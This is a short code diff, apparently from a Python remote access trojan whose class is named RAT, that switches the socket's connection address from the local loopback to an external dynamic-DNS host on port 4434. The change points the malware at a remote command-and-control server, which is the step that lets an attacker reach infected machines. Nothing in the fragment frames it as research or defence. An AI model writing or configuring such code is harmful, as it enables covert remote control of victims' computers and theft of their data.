@@ -176,7 +176,8 @@ class RAT:
 		# set new socket 
 		cls._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		# set loopback address
-		cls._loop = "127.0.0.1" #socket.gethostbyname("localhost")
+		#cls._loop = "127.0.0.1" #socket.gethostbyname("localhost")
+		cls._loop = 'domain.ddns.chickenkiller.com'
 		# set new port
 		cls._port = 4434
 		cls._info = cls.build_info()
